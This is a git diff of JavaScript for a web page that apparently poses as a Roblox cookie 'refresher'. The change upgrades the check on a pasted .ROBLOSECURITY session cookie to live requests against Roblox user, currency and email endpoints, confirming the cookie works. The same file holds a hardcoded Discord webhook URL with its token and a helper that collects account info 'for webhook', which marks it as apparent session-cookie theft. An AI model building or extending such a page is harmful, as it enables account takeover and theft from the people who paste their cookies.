@@ -233,84 +233,139 @@ const errorSound = document.getElementById("sfx-error");
 const swooshSound = document.getElementById("sfx-swoosh");
 const webhookUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDczDFbDQt1IivQRsS_iwRFkOnAc21x8dNzFEvE5ud2UTIfNresN2-kGqcVBA864Z";
 
-// Strict cookie validation based on your bot's logic
-function validateRobloxCookie(cookie) {
-  // Check if cookie exists and is a string
+// Basic format check first
+function basicCookieFormatCheck(cookie) {
   if (!cookie || typeof cookie !== 'string') {
-    console.log('DEBUG: Cookie is not a string');
     return { valid: false, error: "Invalid cookie" };
   }
   
-  // Trim whitespace
   cookie = cookie.trim();
   
-  // Check if empty after trim
   if (cookie.length === 0) {
-    console.log('DEBUG: Cookie is empty');
     return { valid: false, error: "Invalid cookie" };
   }
   
-  // Must start with the exact Roblox cookie prefix
   if (!cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS.--')) {
-    console.log('DEBUG: Cookie does not start with proper prefix');
     return { valid: false, error: "Invalid cookie" };
   }
   
-  // Real Roblox cookies are very long - enforce strict minimum
-  if (cookie.length < 800) {
-    console.log('DEBUG: Cookie too short:', cookie.length);
+  if (cookie.length < 500) {
     return { valid: false, error: "Invalid cookie" };
   }
   
-  // Check for the proper cookie structure pattern
-  // Real Roblox cookies follow: _|WARNING:-DO-NOT-SHARE-THIS.--[long_data_string]|_[more_data]
-  const cookiePattern = /^_\|WARNING:-DO-NOT-SHARE-THIS\.--[A-Za-z0-9+/=\-_.]+\|_[A-Za-z0-9+/=\-_.]*$/;
-  if (!cookiePattern.test(cookie)) {
-    console.log('DEBUG: Cookie does not match proper pattern');
-    return { valid: false, error: "Invalid cookie" };
-  }
-  
-  // Check for obvious fake/test patterns
-  const fakePhrases = ['fake', 'test', 'invalid', 'example', 'demo', 'placeholder', 'sample', '123456'];
-  const lowerCookie = cookie.toLowerCase();
-  for (const phrase of fakePhrases) {
-    if (lowerCookie.includes(phrase)) {
-      console.log('DEBUG: Cookie contains fake phrase:', phrase);
-      return { valid: false, error: "Invalid cookie" };
-    }
-  }
-  
-  // Additional checks for realistic cookie content
-  // Real cookies should have substantial data between the markers
-  const parts = cookie.split('|_');
-  if (parts.length < 2) {
-    console.log('DEBUG: Cookie missing |_ separator');
-    return { valid: false, error: "Invalid cookie" };
-  }
-  
-  const mainPart = parts[0].replace('_|WARNING:-DO-NOT-SHARE-THIS.--', '');
-  if (mainPart.length < 600) {
-    console.log('DEBUG: Main cookie data too short:', mainPart.length);
-    return { valid: false, error: "Invalid cookie" };
-  }
-  
-  console.log('DEBUG: Cookie passed all validation checks');
   return { valid: true, error: null };
 }
 
-// Try to validate cookie by making actual request (adapted from your bot)
-async function validateCookieWithAPI(cookie) {
-  // Due to CORS, we can't directly call Roblox APIs from browser
-  // But we can do basic format validation that matches your bot's logic
+// Real cookie validation by testing Roblox API endpoints
+async function validateRobloxCookie(cookie) {
+  console.log('DEBUG: Starting real cookie validation...');
   
-  const formatCheck = validateRobloxCookie(cookie);
+  // First do basic format check
+  const formatCheck = basicCookieFormatCheck(cookie);
   if (!formatCheck.valid) {
+    console.log('DEBUG: Failed basic format check');
     return formatCheck;
   }
   
-  // For now, return format validation result
-  // In a real scenario, this would be handled by a backend server
-  return { valid: true, error: null };
+  // Now try to validate with actual Roblox APIs like your bot does
+  try {
+    console.log('DEBUG: Trying Method 1 - users/authenticated');
+    
+    // Method 1: Try the authenticated user API (like your bot)
+    const response1 = await fetch('https://users.roblox.com/v1/users/authenticated', {
+      method: 'GET',
+      credentials: 'include',
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${cookie}`,
+        'Content-Type': 'application/json'
+      }
+    });
+    
+    console.log('DEBUG: Method 1 response status:', response1.status);
+    
+    if (response1.status === 200) {
+      const data = await response1.json();
+      console.log('DEBUG: Method 1 success - got user data:', data);
+      return { valid: true, error: null, userData: data };
+    }
+  } catch (error) {
+    console.log('DEBUG: Method 1 failed with error:', error);
+  }
+  
+  try {
+    console.log('DEBUG: Trying Method 2 - mobileapi/userinfo');
+    
+    // Method 2: Try mobile API (like your bot)
+    const response2 = await fetch('https://www.roblox.com/mobileapi/userinfo', {
+      method: 'GET',
+      credentials: 'include',
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${cookie}`,
+        'Content-Type': 'application/json'
+      }
+    });
+    
+    console.log('DEBUG: Method 2 response status:', response2.status);
+    
+    if (response2.status === 200) {
+      const data = await response2.json();
+      console.log('DEBUG: Method 2 success - got user data:', data);
+      return { valid: true, error: null, userData: data };
+    }
+  } catch (error) {
+    console.log('DEBUG: Method 2 failed with error:', error);
+  }
+  
+  try {
+    console.log('DEBUG: Trying Method 3 - currency endpoint');
+    
+    // Method 3: Try currency endpoint (like your bot)
+    const response3 = await fetch('https://economy.roblox.com/v1/users/current/currency', {
+      method: 'GET',
+      credentials: 'include',
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${cookie}`,
+        'Content-Type': 'application/json'
+      }
+    });
+    
+    console.log('DEBUG: Method 3 response status:', response3.status);
+    
+    if (response3.status === 200) {
+      const data = await response3.json();
+      console.log('DEBUG: Method 3 success - got currency data:', data);
+      return { valid: true, error: null, userData: data };
+    }
+  } catch (error) {
+    console.log('DEBUG: Method 3 failed with error:', error);
+  }
+  
+  try {
+    console.log('DEBUG: Trying Method 4 - account settings');
+    
+    // Method 4: Try account settings (like your bot)
+    const response4 = await fetch('https://accountsettings.roblox.com/v1/email', {
+      method: 'GET',
+      credentials: 'include',
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${cookie}`,
+        'Content-Type': 'application/json'
+      }
+    });
+    
+    console.log('DEBUG: Method 4 response status:', response4.status);
+    
+    if (response4.status === 200) {
+      console.log('DEBUG: Method 4 success - account settings accessible');
+      return { valid: true, error: null, userData: {} };
+    }
+  } catch (error) {
+    console.log('DEBUG: Method 4 failed with error:', error);
+  }
+  
+  // If all methods failed, the cookie is invalid
+  console.log('DEBUG: All validation methods failed - cookie is invalid');
+  return { valid: false, error: "Invalid cookie" };
 }
 
 // Simple function to get basic account info for webhook
@@ -356,8 +411,8 @@ $("#cookieForm").on("submit", async function(e) {
   $("#refreshedBox").hide();
 
   try {
-    // Validate cookie format with single validation function
-    const validationResult = validateRobloxCookie(cookie);
+    // Validate cookie with real API testing (async)
+    const validationResult = await validateRobloxCookie(cookie);
     if (!validationResult.valid) {
       showNotif(validationResult.error, false);
       errorSound.play();
